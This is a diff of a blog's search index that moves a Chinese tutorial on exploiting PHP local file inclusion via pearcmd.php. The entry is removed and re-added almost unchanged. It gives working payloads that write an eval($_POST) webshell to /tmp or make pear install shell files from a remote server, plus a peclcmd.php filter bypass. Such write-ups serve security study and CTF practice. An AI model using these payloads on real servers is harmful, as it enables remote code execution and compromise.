@@ -682,121 +682,6 @@
       </categories>
   </entry>
   <entry>
-    <title>利用pearcmd.php进行文件包含</title>
-    <url>/2024/04/28/pearcmd.php/</url>
-    <content><![CDATA[<h3 id="pearcmd-php"><a href="#pearcmd-php" class="headerlink" title="pearcmd.php"></a>pearcmd.php</h3><p>好看，爱看，多看</p>
-<span id="more"></span>
-
-<p><strong>文件包含还可以利用<code>pearcmd.php</code>这个pecl&#x2F;pear中的文件。</strong></p>
-<p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl&#x2F;pear是默认安装的；在7,4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装</p>
-<p><strong>不过，在Docker任意版本镜像中，<code>pcel/pear</code>都会被默认安装，安装的路径一般在<code>/usr/local/lib/php</code>。</strong></p>
-<p>原本pear&#x2F;pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。<strong>但当遇到是一个文件包含的场景，那么我们就可以包含到pear中的文件</strong>，进而利用其中的特性搞事。</p>
-<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
-<li>有pear扩展（这样才能有pearcmd.php）</li>
-<li>php开启了<code>register_argc_argv</code>选项</li>
-<li>知道pearcmd.php的路径（默认路径是&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php）</li>
-<li>有包含点，能包含php后缀的文件，而且没有open_basedir的限制</li>
-</ul>
-<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>注意：以下测试均是镜像为<code>php:7.2-apache</code>并且<code>register_argc_argv</code>为On</p>
-<p><strong>对于<code>register_argc_argv</code>选项，</strong>如果这个选项字段选了<code>ON</code>的话，**URL中?后面的内容会全部传入至<code>$_SERVER[&#39;argv&#39;]</code>这个变量内，而且就算后面的内容含有等号也会被作为键值被赋值给<code>$_SERVER[&#39;argv&#39;]</code>**，如下所示：</p>
-<p><img src="/2024/04/28/pearcmd.php/image-20240427211536292.png" alt="image-20240427211536292"></p>
-<p>pear程序在执行pear命令的时候会在<code>pearcmd.php</code>获取命令行参数，看看pearcmd.php代码：</p>
-<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">PEAR_Command::setFrontendType(<span class="string">&#x27;CLI&#x27;</span>);</span><br><span class="line">$all_commands = PEAR_Command::getCommands();</span><br><span class="line"></span><br><span class="line">$argv = Console_Getopt::readPHPArgv();</span><br><span class="line"><span class="regexp">//</span> fix CGI sapi oddity - the -- in pear.bat/pear is <span class="keyword">not</span> removed</span><br><span class="line"><span class="keyword">if</span> (php_sapi_name() != <span class="string">&#x27;cli&#x27;</span> &amp;&amp; isset($argv[<span class="number">1</span>]) &amp;&amp; $argv[<span class="number">1</span>] == <span class="string">&#x27;--&#x27;</span>) &#123;</span><br><span class="line">    unset($argv[<span class="number">1</span>]);</span><br><span class="line">    $argv = array_values($argv);</span><br><span class="line">&#125;</span><br><span class="line">$progname = PEAR_RUNTYPE;</span><br><span class="line">array_shift($argv);</span><br><span class="line">$options = Console_Getopt::getopt2($argv, <span class="string">&quot;c:C:d:D:Gh?sSqu:vV&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (PEAR::isError($options)) &#123;</span><br><span class="line">    usage($options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到<code>$argv</code>的赋值，再看看pear获取命令行参数的函数<code>Consoles/Getopt.php-&gt;readPHPArgv()</code>：</p>
-<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">public static function readPHPArgv()</span><br><span class="line">    &#123;</span><br><span class="line">        global $argv;</span><br><span class="line">        <span class="keyword">if</span> (!is_array($argv)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!@is_array($_SERVER[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!@is_array($GLOBALS[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                    $msg = <span class="string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> PEAR::raiseError(<span class="string">&quot;Console_Getopt: &quot;</span> . $msg);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> $GLOBALS[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $argv;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里先看<code>$argv</code>是否存在（这个变量储存在命令行模式下运行php脚本时传入的参数），如果不存在，就尝试<code>$_SERVER[&#39;argc&#39;]</code>是否存在，注意这个参数我们可通过<code>query-string</code>控制。（个人看了几篇文章，应该都是直接利用<code>$SERVER[&#39;argv&#39;]</code>，稍微注意一下）</p>
-<p>看一看可以利用的参数：</p>
-<p><img src="/2024/04/28/pearcmd.php/image-20240427210050568.png" alt="image-20240427210050568"></p>
-<p>其中的<code>config-create</code>、<code>install</code>、<code>download</code>可以尝试利用。</p>
-<h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><p>这里需要包含pearcmd.php的原因就是这样才能执行pear程序。</p>
-<h6 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h6><p>为了方便理解后面的payload，这里稍微提前说一点知识，</p>
-<ul>
-<li>如上所说，<code>register_argc_argv</code>选项为On的时候，URL中?后面的内容都会传入<code>$_SERVER[&#39;x&#39;]</code>，但是对于不同符号有区别，看下图比较：</li>
-</ul>
-<p><img src="/2024/04/28/pearcmd.php/image-20240426222128934.png" alt="image-20240426222128934"></p>
-<p><img src="/2024/04/28/pearcmd.php/image-20240426222206499.png" alt="image-20240426222206499"></p>
-<p><img src="/2024/04/28/pearcmd.php/image-20240426222235994.png" alt="image-20240426222235994"></p>
-<p><strong>由此可以很容易看出&amp;是无法分割参数的，真正能优先分隔参数的是+号。</strong></p>
-<ul>
-<li>为什么最前面需要一个+号？看看我们的payload传上去后变量的值，如下：</li>
-</ul>
-<p><img src="/2024/04/28/pearcmd.php/image-20240427223551642.png" alt="image-20240427223551642"></p>
-<p>这里可以看到数组下标为0的内容为空，此时结合pearcmd.php的内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$argv = Console_Getopt::readPHPArgv();</span><br><span class="line">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span><br><span class="line">if (php_sapi_name() != &#x27;cli&#x27; &amp;&amp; isset($argv[1]) &amp;&amp; $argv[1] == &#x27;--&#x27;) &#123;</span><br><span class="line">    unset($argv[1]);</span><br><span class="line">    $argv = array_values($argv);</span><br><span class="line">&#125;</span><br><span class="line">$progname = PEAR_RUNTYPE;</span><br><span class="line">array_shift($argv);</span><br><span class="line">$options = Console_Getopt::getopt2($argv, &quot;c:C:d:D:Gh?sSqu:vV&quot;);</span><br><span class="line">if (PEAR::isError($options)) &#123;</span><br><span class="line">    usage($options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>注意if条件的内容，以及<code>array_shift()</code>函数，函数说明如下：</p>
-<p><img src="/2024/04/28/pearcmd.php/image-20240427224040193.png" alt="image-20240427224040193"></p>
-<p>注意if条件的内容，这个if语句的处理是直接对argv[1]进行分析，所以第一个元素不会发挥作用，故这里需要将第一个单元利用+设置为空字符或其他不会影响pear命令正常执行的参数都可以</p>
-<p>同时可以看看这个函数，个人感觉还是挺有关系的。</p>
-<h6 id="config-create"><a href="#config-create" class="headerlink" title="config-create"></a>config-create</h6><p>对于这个命令，<strong>主要作用就是将内容写入文件中</strong>，需要传入两个参数，第一个参数会被写入到文件中，其中第二个参数是写入的文件路径。</p>
-<p>构造出的payload为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/hello.php</span><br><span class="line"></span><br><span class="line">注意：可以这样设置一句话木马：</span><br><span class="line">&lt;?=@eval($_POST[&#x27;cmd&#x27;]);die()?&gt; </span><br><span class="line">防止多个输出，推荐！！</span><br></pre></td></tr></table></figure>
-
-<p>然后<strong>包含hello.php用蚁剑或者直接连就行</strong>。</p>
-<p>测试了一下，不能直接在浏览器上传payload，由于直接在浏览器传参使得php的如<code>&lt;</code>和单引号等标签因被URL编码而失去效应，<strong>需要抓包后再传参</strong>这样才能被识别为php代码，可以防止浏览器将传入的字符编码。</p>
-<p><strong>对比一下即可：</strong></p>
-<p>正常抓包后传参：</p>
-<p><img src="/2024/04/28/pearcmd.php/image-20240428013848033.png" alt="image-20240428013848033"></p>
-<p>直接传参结果如下：</p>
-<p><img src="/2024/04/28/pearcmd.php/image-20240428014007326.png" alt="image-20240428014007326"></p>
-<p>可以很明显的看出第一张图片中的一句话木马成功作为php代码被解析，所以可以正常利用，</p>
-<p>同时第二张图片也可以看出来并没有正常解析，<strong>所以谨记要抓包后传参。</strong></p>
-<p><strong>一定注意</strong>：需要抓包后修改，因为浏览器会url编码再传入，会导致php的如<code>&lt;</code>等标签会被编码而失去效应</p>
-<h6 id="install"><a href="#install" class="headerlink" title="install"></a>install</h6><p>可以利用install远程连接一个vps下载文件到靶机的临时目录里，再包含这个文件达成rce。</p>
-<p><code>install</code>有<code>--installroot</code>这个选项可以指定他的安装目录</p>
-<p>使用的payload为(基本上不行，主要看下面那个)：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://xxx.xxx/123.php</span><br></pre></td></tr></table></figure>
-
-<p>同样还是抓包传payload（方便），页面回显</p>
-<p><img src="/2024/04/28/pearcmd.php/image-20240428015602654.png" alt="image-20240428015602654"></p>
-<p>这串Payload下载后的文件保存的路径是<code>&amp;file=/usr/local/lib/php/pearcmd.php&amp;/tmp/pear/download</code>，显示不可写，这是配置问题，因为这个目录时新建的，没有权限对其写入从而导致失败。</p>
-<p><strong>另外的payload：</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/tmp+http:<span class="comment">//[ip]:[port]/shell.txt</span></span><br></pre></td></tr></table></figure>
-
-<p>抓包放包后页面如下：</p>
-<p><img src="/2024/04/28/pearcmd.php/image-20240428022500841.png" alt="image-20240428022500841"></p>
-<p>这里给出了路径，然后去包含这个路径即可</p>
-<p><img src="/2024/04/28/pearcmd.php/image-20240428022535506.png" alt="image-20240428022535506"></p>
-<p>测试了一下，<strong>这个shell文件最好不要是php文件，只要有php特征即可</strong>，反正文件包含在识别到后会当做php文件执行。</p>
-<h6 id="download"><a href="#download" class="headerlink" title="download"></a>download</h6><p>payload如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://xxxxxxx/shell.jpg</span><br></pre></td></tr></table></figure>
-
-<p>这个是直接下载到当前页面。</p>
-<p>一直没复现出来，最后要用的时候再搜吧。这里显示：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">downloading shell.txt ...</span><br><span class="line">Could not download from &quot;http://47.100.223.173/shell.txt&quot; (could not open /var/www/html/shell.txt for writing)</span><br><span class="line">Invalid or missing remote package file</span><br><span class="line">download failed</span><br></pre></td></tr></table></figure>
-
-<h6 id="写入配置文件"><a href="#写入配置文件" class="headerlink" title="写入配置文件"></a>写入配置文件</h6><p>类似于第一个，也复现成功</p>
-<p>其他的利用方式，个人感觉挺好的：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pear -c /tmp/shell.php -d man_dir=&lt;?=eval($_POST[&#x27;x&#x27;]);?&gt; -s</span><br></pre></td></tr></table></figure>
-
-<p>看看选项：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@VM-0-6-ubuntu:~/somefile# pear help options</span><br><span class="line">Options:</span><br><span class="line">     -v         increase verbosity level (default 1)</span><br><span class="line">     -q         be quiet, decrease verbosity level</span><br><span class="line">     -c file    find user configuration in `file&#x27;</span><br><span class="line">     -C file    find system configuration in `file&#x27;</span><br><span class="line">     -d foo=bar set user config variable `foo&#x27; to `bar&#x27;</span><br><span class="line">     -D foo=bar set system config variable `foo&#x27; to `bar&#x27;</span><br><span class="line">     -G         start in graphical (Gtk) mode</span><br><span class="line">     -s         store user configuration</span><br><span class="line">     -S         store system configuration</span><br><span class="line">     -u foo     unset `foo&#x27; in the user configuration</span><br><span class="line">     -h, -?     display help/usage (this message)</span><br><span class="line">     -V         version information</span><br></pre></td></tr></table></figure>
-
-<p>相当于写配置到<code>/tmp/shell.php</code>,payload如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/shell.php+-d+man_dir=&lt;?eval($_POST[&#x27;x&#x27;]);?&gt;+-s+</span><br></pre></td></tr></table></figure>
-
-<p>复现成功：<br><img src="/2024/04/28/pearcmd.php/image-20240428032008052.png" alt="image-20240428032008052"></p>
-<h5 id="小绕过"><a href="#小绕过" class="headerlink" title="小绕过"></a>小绕过</h5><p>当<code>pearcmd</code>关键词被ban，可以使用<code>peclcmd.php</code>作为平替，在这个php文件中其实就是引用了pearcmd.php</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (&#x27;/www/server/php/52/lib/php&#x27; != &#x27;@&#x27;.&#x27;include_path&#x27;.&#x27;@&#x27;) &#123;</span><br><span class="line">    ini_set(&#x27;include_path&#x27;, &#x27;/www/server/php/52/lib/php&#x27;);</span><br><span class="line">    $raw = false;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    // this is a raw, uninstalled pear, either a cvs checkout, or php distro</span><br><span class="line">    $raw = true;</span><br><span class="line">&#125;</span><br><span class="line">define(&#x27;PEAR_RUNTYPE&#x27;, &#x27;pecl&#x27;);</span><br><span class="line">require_once &#x27;pearcmd.php&#x27;;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p>参考文章:<br><code>https://xilitter.github.io/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/index.html</code></p>
-<p><code>https://blog.csdn.net/Mrs_H/article/details/122386511</code></p>
-<p><code>https://y4tacker.github.io/2022/06/19/year/2022/6/%E5%85%B3%E4%BA%8Epearcmd%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</code></p>
-<p><code>https://yuy0ung.github.io/2024/03/27/pearcmd/</code></p>
-]]></content>
-      <categories>
-        <category>php相关漏洞</category>
-        <category>文件包含</category>
-        <category>利用pearcmd.php</category>
-      </categories>
-  </entry>
-  <entry>
     <title>pickle反序列化</title>
     <url>/2024/05/09/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
     <content><![CDATA[<h1 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h1><p>本篇文章用于简单入门，pickle反序列化危害性大，可以直接RCE</p>
@@ -1291,6 +1176,121 @@
       </categories>
   </entry>
   <entry>
+    <title>利用pearcmd.php进行文件包含</title>
+    <url>/2024/04/28/pearcmd.php/</url>
+    <content><![CDATA[<h3 id="pearcmd-php"><a href="#pearcmd-php" class="headerlink" title="pearcmd.php"></a>pearcmd.php</h3><p>好看，爱看，多看</p>
+<span id="more"></span>
+
+<p><strong>文件包含还可以利用<code>pearcmd.php</code>这个pecl&#x2F;pear中的文件。</strong></p>
+<p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl&#x2F;pear是默认安装的；在7,4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装</p>
+<p><strong>不过，在Docker任意版本镜像中，<code>pcel/pear</code>都会被默认安装，安装的路径一般在<code>/usr/local/lib/php</code>。</strong></p>
+<p>原本pear&#x2F;pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。<strong>但当遇到是一个文件包含的场景，那么我们就可以包含到pear中的文件</strong>，进而利用其中的特性搞事。</p>
+<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
+<li>有pear扩展（这样才能有pearcmd.php）</li>
+<li>php开启了<code>register_argc_argv</code>选项</li>
+<li>知道pearcmd.php的路径（默认路径是&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php）</li>
+<li>有包含点，能包含php后缀的文件，而且没有open_basedir的限制</li>
+</ul>
+<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>注意：以下测试均是镜像为<code>php:7.2-apache</code>并且<code>register_argc_argv</code>为On</p>
+<p><strong>对于<code>register_argc_argv</code>选项，</strong>如果这个选项字段选了<code>ON</code>的话，**URL中?后面的内容会全部传入至<code>$_SERVER[&#39;argv&#39;]</code>这个变量内，而且就算后面的内容含有等号也会被作为键值被赋值给<code>$_SERVER[&#39;argv&#39;]</code>**，如下所示：</p>
+<p><img src="/2024/04/28/pearcmd.php/image-20240427211536292.png" alt="image-20240427211536292"></p>
+<p>pear程序在执行pear命令的时候会在<code>pearcmd.php</code>获取命令行参数，看看pearcmd.php代码：</p>
+<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">PEAR_Command::setFrontendType(<span class="string">&#x27;CLI&#x27;</span>);</span><br><span class="line">$all_commands = PEAR_Command::getCommands();</span><br><span class="line"></span><br><span class="line">$argv = Console_Getopt::readPHPArgv();</span><br><span class="line"><span class="regexp">//</span> fix CGI sapi oddity - the -- in pear.bat/pear is <span class="keyword">not</span> removed</span><br><span class="line"><span class="keyword">if</span> (php_sapi_name() != <span class="string">&#x27;cli&#x27;</span> &amp;&amp; isset($argv[<span class="number">1</span>]) &amp;&amp; $argv[<span class="number">1</span>] == <span class="string">&#x27;--&#x27;</span>) &#123;</span><br><span class="line">    unset($argv[<span class="number">1</span>]);</span><br><span class="line">    $argv = array_values($argv);</span><br><span class="line">&#125;</span><br><span class="line">$progname = PEAR_RUNTYPE;</span><br><span class="line">array_shift($argv);</span><br><span class="line">$options = Console_Getopt::getopt2($argv, <span class="string">&quot;c:C:d:D:Gh?sSqu:vV&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (PEAR::isError($options)) &#123;</span><br><span class="line">    usage($options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>$argv</code>的赋值，再看看pear获取命令行参数的函数<code>Consoles/Getopt.php-&gt;readPHPArgv()</code>：</p>
+<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">public static function readPHPArgv()</span><br><span class="line">    &#123;</span><br><span class="line">        global $argv;</span><br><span class="line">        <span class="keyword">if</span> (!is_array($argv)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!@is_array($_SERVER[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!@is_array($GLOBALS[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                    $msg = <span class="string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> PEAR::raiseError(<span class="string">&quot;Console_Getopt: &quot;</span> . $msg);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> $GLOBALS[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $argv;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里先看<code>$argv</code>是否存在（这个变量储存在命令行模式下运行php脚本时传入的参数），如果不存在，就尝试<code>$_SERVER[&#39;argc&#39;]</code>是否存在，注意这个参数我们可通过<code>query-string</code>控制。（个人看了几篇文章，应该都是直接利用<code>$SERVER[&#39;argv&#39;]</code>，稍微注意一下）</p>
+<p>看一看可以利用的参数：</p>
+<p><img src="/2024/04/28/pearcmd.php/image-20240427210050568.png" alt="image-20240427210050568"></p>
+<p>其中的<code>config-create</code>、<code>install</code>、<code>download</code>可以尝试利用。</p>
+<h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><p>这里需要包含pearcmd.php的原因就是这样才能执行pear程序。</p>
+<h6 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h6><p>为了方便理解后面的payload，这里稍微提前说一点知识，</p>
+<ul>
+<li>如上所说，<code>register_argc_argv</code>选项为On的时候，URL中?后面的内容都会传入<code>$_SERVER[&#39;x&#39;]</code>，但是对于不同符号有区别，看下图比较：</li>
+</ul>
+<p><img src="/2024/04/28/pearcmd.php/image-20240426222128934.png" alt="image-20240426222128934"></p>
+<p><img src="/2024/04/28/pearcmd.php/image-20240426222206499.png" alt="image-20240426222206499"></p>
+<p><img src="/2024/04/28/pearcmd.php/image-20240426222235994.png" alt="image-20240426222235994"></p>
+<p><strong>由此可以很容易看出&amp;是无法分割参数的，真正能优先分隔参数的是+号。</strong></p>
+<ul>
+<li>为什么最前面需要一个+号？看看我们的payload传上去后变量的值，如下：</li>
+</ul>
+<p><img src="/2024/04/28/pearcmd.php/image-20240427223551642.png" alt="image-20240427223551642"></p>
+<p>这里可以看到数组下标为0的内容为空，此时结合pearcmd.php的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$argv = Console_Getopt::readPHPArgv();</span><br><span class="line">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span><br><span class="line">if (php_sapi_name() != &#x27;cli&#x27; &amp;&amp; isset($argv[1]) &amp;&amp; $argv[1] == &#x27;--&#x27;) &#123;</span><br><span class="line">    unset($argv[1]);</span><br><span class="line">    $argv = array_values($argv);</span><br><span class="line">&#125;</span><br><span class="line">$progname = PEAR_RUNTYPE;</span><br><span class="line">array_shift($argv);</span><br><span class="line">$options = Console_Getopt::getopt2($argv, &quot;c:C:d:D:Gh?sSqu:vV&quot;);</span><br><span class="line">if (PEAR::isError($options)) &#123;</span><br><span class="line">    usage($options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意if条件的内容，以及<code>array_shift()</code>函数，函数说明如下：</p>
+<p><img src="/2024/04/28/pearcmd.php/image-20240427224040193.png" alt="image-20240427224040193"></p>
+<p>注意if条件的内容，这个if语句的处理是直接对argv[1]进行分析，所以第一个元素不会发挥作用，故这里需要将第一个单元利用+设置为空字符或其他不会影响pear命令正常执行的参数都可以</p>
+<p>同时可以看看这个函数，个人感觉还是挺有关系的。</p>
+<h6 id="config-create"><a href="#config-create" class="headerlink" title="config-create"></a>config-create</h6><p>对于这个命令，<strong>主要作用就是将内容写入文件中</strong>，需要传入两个参数，第一个参数会被写入到文件中，其中第二个参数是写入的文件路径。</p>
+<p>构造出的payload为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/hello.php</span><br><span class="line"></span><br><span class="line">注意：可以这样设置一句话木马：</span><br><span class="line">&lt;?=@eval($_POST[&#x27;cmd&#x27;]);die()?&gt; </span><br><span class="line">防止多个输出，推荐！！</span><br></pre></td></tr></table></figure>
+
+<p>然后<strong>包含hello.php用蚁剑或者直接连就行</strong>。</p>
+<p>测试了一下，不能直接在浏览器上传payload，由于直接在浏览器传参使得php的如<code>&lt;</code>和单引号等标签因被URL编码而失去效应，<strong>需要抓包后再传参</strong>这样才能被识别为php代码，可以防止浏览器将传入的字符编码。</p>
+<p><strong>对比一下即可：</strong></p>
+<p>正常抓包后传参：</p>
+<p><img src="/2024/04/28/pearcmd.php/image-20240428013848033.png" alt="image-20240428013848033"></p>
+<p>直接传参结果如下：</p>
+<p><img src="/2024/04/28/pearcmd.php/image-20240428014007326.png" alt="image-20240428014007326"></p>
+<p>可以很明显的看出第一张图片中的一句话木马成功作为php代码被解析，所以可以正常利用，</p>
+<p>同时第二张图片也可以看出来并没有正常解析，<strong>所以谨记要抓包后传参。</strong></p>
+<p><strong>一定注意</strong>：需要抓包后修改，因为浏览器会url编码再传入，会导致php的如<code>&lt;</code>等标签会被编码而失去效应</p>
+<h6 id="install"><a href="#install" class="headerlink" title="install"></a>install</h6><p>可以利用install远程连接一个vps下载文件到靶机的临时目录里，再包含这个文件达成rce。</p>
+<p><code>install</code>有<code>--installroot</code>这个选项可以指定他的安装目录</p>
+<p>使用的payload为(基本上不行，主要看下面那个)：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://xxx.xxx/123.php</span><br></pre></td></tr></table></figure>
+
+<p>同样还是抓包传payload（方便），页面回显</p>
+<p><img src="/2024/04/28/pearcmd.php/image-20240428015602654.png" alt="image-20240428015602654"></p>
+<p>这串Payload下载后的文件保存的路径是<code>&amp;file=/usr/local/lib/php/pearcmd.php&amp;/tmp/pear/download</code>，显示不可写，这是配置问题，因为这个目录时新建的，没有权限对其写入从而导致失败。</p>
+<p><strong>另外的payload：</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/tmp+http:<span class="comment">//[ip]:[port]/shell.txt</span></span><br></pre></td></tr></table></figure>
+
+<p>抓包放包后页面如下：</p>
+<p><img src="/2024/04/28/pearcmd.php/image-20240428022500841.png" alt="image-20240428022500841"></p>
+<p>这里给出了路径，然后去包含这个路径即可</p>
+<p><img src="/2024/04/28/pearcmd.php/image-20240428022535506.png" alt="image-20240428022535506"></p>
+<p>测试了一下，<strong>这个shell文件最好不要是php文件，只要有php特征即可</strong>，反正文件包含在识别到后会当做php文件执行。</p>
+<h6 id="download"><a href="#download" class="headerlink" title="download"></a>download</h6><p>payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://xxxxxxx/shell.jpg</span><br></pre></td></tr></table></figure>
+
+<p>这个是直接下载到当前页面。</p>
+<p>一直没复现出来，最后要用的时候再搜吧。这里显示：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">downloading shell.txt ...</span><br><span class="line">Could not download from &quot;http://47.100.223.173/shell.txt&quot; (could not open /var/www/html/shell.txt for writing)</span><br><span class="line">Invalid or missing remote package file</span><br><span class="line">download failed</span><br></pre></td></tr></table></figure>
+
+<h6 id="写入配置文件"><a href="#写入配置文件" class="headerlink" title="写入配置文件"></a>写入配置文件</h6><p>类似于第一个，也复现成功</p>
+<p>其他的利用方式，个人感觉挺好的：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pear -c /tmp/shell.php -d man_dir=&lt;?=eval($_POST[&#x27;x&#x27;]);?&gt; -s</span><br></pre></td></tr></table></figure>
+
+<p>看看选项：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@VM-0-6-ubuntu:~/somefile# pear help options</span><br><span class="line">Options:</span><br><span class="line">     -v         increase verbosity level (default 1)</span><br><span class="line">     -q         be quiet, decrease verbosity level</span><br><span class="line">     -c file    find user configuration in `file&#x27;</span><br><span class="line">     -C file    find system configuration in `file&#x27;</span><br><span class="line">     -d foo=bar set user config variable `foo&#x27; to `bar&#x27;</span><br><span class="line">     -D foo=bar set system config variable `foo&#x27; to `bar&#x27;</span><br><span class="line">     -G         start in graphical (Gtk) mode</span><br><span class="line">     -s         store user configuration</span><br><span class="line">     -S         store system configuration</span><br><span class="line">     -u foo     unset `foo&#x27; in the user configuration</span><br><span class="line">     -h, -?     display help/usage (this message)</span><br><span class="line">     -V         version information</span><br></pre></td></tr></table></figure>
+
+<p>相当于写配置到<code>/tmp/shell.php</code>,payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/shell.php+-d+man_dir=&lt;?eval($_POST[&#x27;x&#x27;]);?&gt;+-s+</span><br></pre></td></tr></table></figure>
+
+<p>复现成功：<br><img src="/2024/04/28/pearcmd.php/image-20240428032008052.png" alt="image-20240428032008052"></p>
+<h5 id="小绕过"><a href="#小绕过" class="headerlink" title="小绕过"></a>小绕过</h5><p>当<code>pearcmd</code>关键词被ban，可以使用<code>peclcmd.php</code>作为平替，在这个php文件中其实就是引用了pearcmd.php</p>
